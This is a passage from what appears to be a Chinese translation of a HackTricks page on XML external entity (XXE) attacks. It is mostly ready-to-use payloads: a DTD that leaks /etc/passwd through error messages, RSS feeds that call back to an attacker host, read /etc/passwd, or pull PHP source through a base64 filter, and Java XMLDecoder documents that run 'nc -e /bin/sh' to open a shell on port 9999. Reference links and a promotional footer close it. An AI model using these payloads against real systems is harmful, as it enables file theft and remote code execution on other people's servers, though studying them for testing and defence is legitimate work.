```
很好！`non-exist` 文件反映在错误消息中。接下来是添加文件内容。

DTD 文件：
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
And the content of the file was successfully **printed in the output of the error sent via HTTP**.

## RSS - XEE

有效的 XML 与 RSS 格式来利用 XXE 漏洞。

### Ping back

简单的 HTTP 请求到攻击者服务器
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### 读取文件
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### 阅读源代码

使用 PHP base64 过滤器
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE 至 RCE

XMLDecoder 是一个 Java 类，它根据 XML 消息创建对象。如果恶意用户能够让应用程序在调用 **readObject** 方法时使用任意数据，他将立即在服务器上获得代码执行能力。

### 使用 Runtime().exec()
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## 工具

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## 更多资源

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
通过使用自己的外部DTD通过HTTP提取信息: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击直到成为英雄！</strong></summary>

其他支持HackTricks的方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
